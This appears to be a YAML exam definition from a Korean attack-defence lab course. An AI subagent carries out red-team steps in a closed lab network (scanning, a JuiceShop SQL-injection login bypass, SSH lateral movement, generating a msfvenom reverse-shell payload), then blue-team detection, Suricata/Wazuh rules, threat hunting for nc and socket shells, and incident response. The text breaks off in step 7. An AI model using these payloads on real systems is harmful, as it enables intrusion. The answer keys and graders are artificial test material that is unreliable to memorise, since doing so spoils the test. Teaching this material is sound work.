lab_id: battle-adv-ai-week15
title: 종합 평가 — 전체 과정 실전 시험 + 보고서 (AI 지원)
version: ai
course: battle-adv-ai
week: 15
description: 14주간 학습한 공방전 심화 기술을 종합 평가한다. APT 시뮬레이션, 실시간 방어, 위협 헌팅, 포렌식, SOAR, 퍼플팀 운영, 보고서 작성을 포괄하는 실전
  시험을 수행한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 150
objectives:
- APT 킬체인 전체를 자율적으로 수행할 수 있다
- 실시간 침입을 탐지하고 차단할 수 있다
- 위협 헌팅과 포렌식 분석을 수행할 수 있다
- 전문적인 보안 보고서를 작성할 수 있다
prerequisites:
- battle-adv-nonai week01~week14 전체 이수
infra_requirements:
- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
- secu (10.20.30.1) — nftables, suricata
- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[시험 1/RED] 정보 수집 — 10.20.30.0/24를 정찰하여 모든 활성 호스트와 서비스를 식별하라. 결과를 구조화된 형식으로 정리하라.'
  hint: nmap으로 호스트 발견 + 서비스 스캔을 수행하고 결과를 표로 정리한다.
  category: recon
  points: 10
  answer: '🤖 프롬프트: [시험 1/RED] 정보 수집 — 10.20.30.0/24를 정찰하여 모든 활성 호스트와 서비스를 식별해줘

    📎 참고 (CLI): nmap -sV --top-ports 50 --max-retries 1 --host-timeout 15s -T4 10.20.30.0/24 -oN /tmp/exam_recon.txt
    2>&1 | tail -30 && echo "---" && echo "Structured: Host | Port | Service | Version" && grep "open"
    /tmp/exam_recon.txt | head -20'
  answer_detail: 종합 시험의 정찰 단계에서 네트워크 전체를 스캔하고 결과를 구조화한다. 시간 제약 내에 효율적으로 완료하는 것이 중요하다.
  verify:
    type: output_contains
    expect: open
    semantic:
      intent: '[시험 1/RED] 종합 시험 정보 수집 — nmap -sn 10.20.30.0/24 로 활성 호스트 발견 + nmap -sV --top-ports 100
        각 호스트 (secu·web·siem) 서비스 탐지. 결과를 /tmp/exam_recon.txt 에 구조화 저장 (hostname·IP·open port·service·version
        표). 15주 학습 성과 평가의 첫 관문'
      success_criteria:
      - nmap -sn + -sV 두 단계
      - /tmp/exam_recon.txt 구조화 저장
      - 시험 맥락 (독립 수행)
      acceptable_methods:
      - nmap + 표 작성
      - masscan + nmap 2-stage
      - curl -I + tabulate
      negative_signs:
      - 단일 호스트만
      - 결과 저장 없음
      - 독립 수행 아닌 복사
  target_vm: attacker
  script: 'nmap -sV --top-ports 50 --max-retries 1 --host-timeout 15s -T4 10.20.30.0/24 -oN /tmp/exam_recon.txt
    2>&1 | tail -30 && echo "---" && echo "Structured: Host | Port | Service | Version" && grep "open"
    /tmp/exam_recon.txt | head -20'
  risk_level: low
  bastion_prompt: '[시험 1/RED] 정보 수집 — 10.20.30.0/24를 정찰하여 모든 활성 호스트와 서비스를 식별해줘'
- order: 2
  instruction: '[시험 2/RED] 초기 침투 — SQL Injection으로 JuiceShop 관리자 인증을 우회하라.'
  hint: REST API에 SQL Injection 페이로드를 전송한다.
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: [시험 2/RED] 초기 침투 — SQL Injection으로 JuiceShop 관리자 인증을 우회해줘\n\U0001F4CE 참고 (CLI):\
    \ curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
    \ \\\n  -d '{\"email\":\"\\\" OR 1=1--\",\"password\":\"x\"}' \\\n | python3 -m json.tool | head -10\
    \ && echo '--- Initial access via SQLi (T1190) ---'"
  answer_detail: SQLi로 인증을 우회하여 admin JWT 토큰을 획득한다. 최소한의 시도로 성공하는 능력이 평가된다.
  verify:
    type: output_contains
    expect: Initial access
    semantic:
      intent: '[시험 2/RED] 초기 침투 — curl -s -X POST http://<web>:3000/rest/user/login -H Content-Type: application/json
        -d {email: '' or 1=1--, password: x} 로 JuiceShop 관리자 인증 우회 → JWT 토큰 획득 → /tmp/exam_jwt.txt 저장.
        성공 시 /api/Users 접근 확인'
      success_criteria:
      - /rest/user/login SQLi
      - JWT 토큰 획득 + /tmp 저장
      - /api 접근 검증
      acceptable_methods:
      - curl POST + JSON body
      - sqlmap
      - python requests
      negative_signs:
      - 토큰 미획득
      - JSON 바디 아닌 form
      - API 접근 검증 없음
  target_vm: attacker
  script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
    \ \\\n  -d '{\"email\":\"\\\" OR 1=1--\",\"password\":\"x\"}' \\\n | python3 -m json.tool | head -10\
    \ && echo '--- Initial access via SQLi (T1190) ---'"
  risk_level: medium
  bastion_prompt: '[시험 2/RED] 초기 침투 — SQL Injection으로 JuiceShop 관리자 인증을 우회해줘'
- order: 3
  instruction: '[시험 3/RED] 측면 이동 — SSH로 내부 서버에 접근하고, msfvenom 페이로드를 생성(저장만)하라.'
  hint: SSH로 {{SECU_IP}}과 {{SECU_IP}}00에 접근하고, msfvenom 페이로드를 생성한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [시험 3/RED] 측면 이동 — SSH로 내부 서버에 접근하고, msfvenom 페이로드를 생성(저장만)해줘

    📎 참고 (CLI): echo "=== Lateral Movement ===" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no
    ccc@10.20.30.1 "hostname && id" 2>&1 | head -3 && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no
    ccc@10.20.30.100 "hostname && id" 2>&1 | head -3 && echo "2 hosts accessed (T1021.004)" && msfvenom
    -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/exam_payload.elf 2>&1
    | tail -2'
  answer_detail: 측면 이동과 Weaponization을 연계한다. SSH로 2개 추가 호스트에 접근하고 msfvenom 페이로드를 생성(저장만)한다.
  verify:
    type: output_contains
    expect: Lateral Movement
    semantic:
      intent: '[시험 3/RED] 측면 이동 — ssh ccc@<secu> hostname && id + ssh ccc@<web> uname -a (내부 서버 2개 접근)
        + msfvenom -p linux/x64/shell_reverse_tcp -f elf -o /tmp/exam_payload.elf (생성만·실행 없음). 측면 이동 실증
        + weaponization 보조'
      success_criteria:
      - SSH 내부 서버 2+ 접근
      - msfvenom payload 생성 (저장만)
      - 측면 이동 + weapon 조합
      acceptable_methods:
      - ssh + msfvenom -f elf
      - crackmapexec smb
      - Sliver beacon 생성
      negative_signs:
      - 1 서버만
      - payload 실제 실행
      - 측면 이동 개념 없음
  target_vm: attacker
  script: echo "=== Lateral Movement ===" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1
    "hostname && id" 2>&1 | head -3 && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.100
    "hostname && id" 2>&1 | head -3 && echo "2 hosts accessed (T1021.004)" && msfvenom -p linux/x64/shell_reverse_tcp
    LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/exam_payload.elf 2>&1 | tail -2
  risk_level: medium
  bastion_prompt: '[시험 3/RED] 측면 이동 — SSH로 내부 서버에 접근하고, msfvenom 페이로드를 생성(저장만)해줘'
- order: 4
  instruction: '[시험 4/BLUE] 관점 전환 — 방금 수행한 공격을 탐지하라. 어떤 로그에서 공격 흔적을 발견할 수 있는지 분석하라.'
  hint: auth.log, Suricata eve.json, 네트워크 연결에서 공격 증거를 찾는다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [시험 4/BLUE] 관점 전환 — 방금 수행한 공격을 탐지해줘

    📎 참고 (CLI): echo "=== Blue Team Detection ===" && echo "[1] auth.log:" && grep -E "Accepted|Failed"
    /var/log/auth.log 2>/dev/null | tail -5 && echo "[2] Network:" && ss -tn | grep "10.20.30" | head
    -5 && echo "[3] Evidence found:" && echo "  - SQLi: WAF log shows UNION SELECT payload" && echo "  -
    SSH lateral: auth.log shows multi-host login" && echo "  - Gap: No DNS C2 monitoring"'
  answer_detail: 공격자 관점에서 수행한 행동을 방어자 관점에서 분석하여 탐지 가능 지점과 Gap을 파악한다.
  verify:
    type: output_contains
    expect: Blue Team Detection
    semantic:
      intent: '[시험 4/BLUE] 관점 전환 자가 탐지 — s1-s3 공격을 공격자 → 방어자 관점 전환 후 흔적 찾기: auth.log (SSH 접속 Accepted·Failed)
        + access.log (SQLi URL 패턴) + Suricata fast.log (SCAN·WEB-ATTACK) + ls /tmp (msfvenom payload).
        모든 공격이 어떤 로그에 남았는지 종합 리뷰. 자기 공격 사후 분석'
      success_criteria:
      - 최소 3 로그 조회 (auth·access·Suricata·files)
      - s1-s3 공격 흔적 식별
      - 자가 탐지 관점 전환
      acceptable_methods:
      - tail + grep 복수 로그
      - Wazuh timeline
      - jq 로 eve.json
      negative_signs:
      - 1-2 로그만
      - s1-s3 연관 없음
      - 관점 전환 개념 없음
  target_vm: secu
  script: 'echo "=== Blue Team Detection ===" && echo "[1] auth.log:" && grep -E "Accepted|Failed" /var/log/auth.log
    2>/dev/null | tail -5 && echo "[2] Network:" && ss -tn | grep "10.20.30" | head -5 && echo "[3] Evidence
    found:" && echo "  - SQLi: WAF log shows UNION SELECT payload" && echo "  - SSH lateral: auth.log
    shows multi-host login" && echo "  - Gap: No DNS C2 monitoring"'
  risk_level: low
  bastion_prompt: '[시험 4/BLUE] 관점 전환 — 방금 수행한 공격을 탐지해줘'
- order: 5
  instruction: '[시험 5/BLUE] 탐지 규칙 작성 — 발견된 Gap에 대한 Suricata 또는 Wazuh 규칙을 작성하라.'
  hint: 탐지되지 않은 공격에 대한 규칙을 작성한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [시험 5/BLUE] 탐지 규칙 작성 — 발견된 Gap에 대한 Suricata 또는 Wazuh 규칙을 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): cat > /tmp/exam_detection_rule.txt << ''EOF'' # Suricata: SQL Injection in POST body alert
    http any any -> 10.20.30.0/24 any (msg:"EXAM: SQLi in POST"; flow:to_server,established; http.method;
    content:"POST"; http.request_body; content:"OR"; nocase; content:"1=1"; distance:0; within:10; sid:9000001;
    rev:1;)

    # Wazuh: SSH lateral movement correlation <rule id="100700" level="12" frequency="3" timeframe="300">
    <if_sid>5715</if_sid> <same_user /> <description>EXAM: Lateral movement - same user SSH to 3+ hosts</description>
    <mitre><id>T1021.004</id></mitre> </rule> EOF cat /tmp/exam_detection_rule.txt'
  answer_detail: SQLi 탐지(HTTP POST body 패턴)와 SSH 측면 이동 탐지(동일 사용자 다중 호스트)를 Suricata/Wazuh 규칙으로 작성한다.
  verify:
    type: output_contains
    expect: EXAM
    semantic:
      intent: '[시험 5/BLUE] 탐지 룰 작성 — s4 에서 발견된 Gap(예: msfvenom payload 생성 이벤트 미탐지·내부 SSH 측면 이동 임계치 느슨)
        에 대해 Suricata(alert tcp flags:S 내부→내부 threshold) 또는 Wazuh(syscheck real-time=yes /tmp + ELF magic
        bytes 룰). /etc/suricata/rules/local.rules 또는 local_rules.xml 편집'
      success_criteria:
      - Gap 기반 새 룰 작성
      - Suricata 또는 Wazuh 포맷
      - 시스템 적용 (/etc/suricata 또는 /var/ossec)
      acceptable_methods:
      - alert tcp ... threshold 조정
      - Wazuh syscheck + decoder
      - Sigma rule 변환
      negative_signs:
      - Gap 분석 없이 일반 룰
      - 적용 없음 (작성만)
      - s4 연결 없음
  target_vm: secu
  script: 'cat > /tmp/exam_detection_rule.txt << ''EOF'' # Suricata: SQL Injection in POST body alert
    http any any -> 10.20.30.0/24 any (msg:"EXAM: SQLi in POST"; flow:to_server,established; http.method;
    content:"POST"; http.request_body; content:"OR"; nocase; content:"1=1"; distance:0; within:10; sid:9000001;
    rev:1;)

    # Wazuh: SSH lateral movement correlation <rule id="100700" level="12" frequency="3" timeframe="300">
    <if_sid>5715</if_sid> <same_user /> <description>EXAM: Lateral movement - same user SSH to 3+ hosts</description>
    <mitre><id>T1021.004</id></mitre> </rule> EOF cat /tmp/exam_detection_rule.txt'
  risk_level: low
  bastion_prompt: '[시험 5/BLUE] 탐지 규칙 작성 — 발견된 Gap에 대한 Suricata 또는 Wazuh 규칙을 작성하라.'
- order: 6
  instruction: '[시험 6/BLUE] 위협 헌팅 — 현재 시스템에서 3가지 이상의 소스를 분석하여 진행 중인 위협이 없는지 능동적으로 헌팅하라.'
  hint: 프로세스, 네트워크, 파일 시스템을 교차 분석한다.
  category: analysis
  points: 10
  answer: '🤖 프롬프트: [시험 6/BLUE] 위협 헌팅 — 현재 시스템에서 3가지 이상의 소스를 분석하여 진행 중인 위협이 없는지 능동적으로 헌팅해줘

    📎 참고 (CLI): echo "=== Threat Hunting ===" && echo "[1] Process:" && ps aux | grep -E "nc -|ncat|python.*socket|perl.*socket"
    | grep -v grep || echo "Clean" && echo "[2] Network:" && ss -tn | grep -v "10.20.30\|127.0" | head
    -5 || echo "Clean" && echo "[3] Files:" && find /tmp /dev/shm -name ".*" -type f 2>/dev/null || echo
    "Clean" && echo "Hunting: No active threats detected"'
  answer_detail: 프로세스(리버스 쉘), 네트워크(비정상 아웃바운드), 파일 시스템(숨김 파일)을 교차 분석하여 위협을 선제적으로 탐색한다.
  verify:
    type: output_contains
    expect: Threat Hunting
    semantic:
      intent: '[시험 6/BLUE] 능동적 위협 헌팅 — 3+ 소스 분석: (1) find / -mtime -1 -type f (최근 수정 파일) (2) ps auxf |
        grep -E (sh -i|bash -i|nc) (reverse shell) (3) jq DNS 엔트로피 > 3.5 eve.json (4) crontab -l + /etc/cron.d
        (지속성). 가설 수립 없이 heuristic search. 시험에서 독립 헌팅 수행'
      success_criteria:
      - 3+ 소스 헌팅
      - find + ps + DNS + cron 등
      - 능동 탐색 (가설 → 검증)
      acceptable_methods:
      - 복합 find + ps + jq
      - Sigma rule 매칭
      - osquery 복합 쿼리
      negative_signs:
      - 1-2 소스만
      - 가설 없이 나열만
      - 능동 탐색 개념 없음
  target_vm: secu
  script: 'echo "=== Threat Hunting ===" && echo "[1] Process:" && ps aux | grep -E "nc -|ncat|python.*socket|perl.*socket"
    | grep -v grep || echo "Clean" && echo "[2] Network:" && ss -tn | grep -v "10.20.30\|127.0" | head
    -5 || echo "Clean" && echo "[3] Files:" && find /tmp /dev/shm -name ".*" -type f 2>/dev/null || echo
    "Clean" && echo "Hunting: No active threats detected"'
  risk_level: low
  bastion_prompt: '[시험 6/BLUE] 위협 헌팅 — 현재 시스템에서 3가지 이상의 소스를 분석하여 진행 중인 위협이 없는지 능동적으로 헌팅해줘'
- order: 7
  instruction: '[시험 7/BLUE] 인시던트 대응 — SQL Injection 공격이 발생했다고 가정하고, IR 절차에 따라 5분 이내에 격리와 증거 수집을 완료하라.'
  hint: IP 차단 -> 증거 수집 -> 알림 순서로 대응한다.
  category: response
  points: 10
  answer: '🤖 프롬프트: [시험 7/BLUE] 인시던트 대응 — SQL Injection 공격이 발생했다고 가정하고, IR 절차에 따라 5분 이내에 격리와 증거 수집을 완료해줘

    📎 참고 (CLI): echo "=== Incident Response ===" && TIMESTAMP=$(date -u "+%Y-%m-%dT%H:%M:%SZ") && echo
    "[$TIMESTAMP] INCIDENT: SQLi from 203.0.113.50" && echo "[1] CONTAIN (T+0s): nft add element inet
    filter blocklist { 203.0.113.50 }" && echo "[2] EVIDENCE (T+60s): WAF logs, Suricata alerts collected"
    && mkdir -p /tmp/exam_evidence && echo "IR-$TIMESTAMP" > /tmp/exam_evidence/incident.txt && echo "[3]
    NOTIFY (T+90s): SOC team notified" && echo "Response time: ~90s (SLA: 5 min) - PASSED"'
  answer_detail: 격리(T+0s), 증거 수집(T+60s), 알림(T+90s)을 90초 내에 완료한다. SLA(5분) 대비 여유있는 대응이다.
  verify:
    type: output_contains
    expect: Incident Response
    semantic:
      intent: '[시험 7/BLUE] 인시던트 대응 5분 내 — SQLi 가정 시 (1) 확인 1분: grep UNION access.log + Suricata fast.log
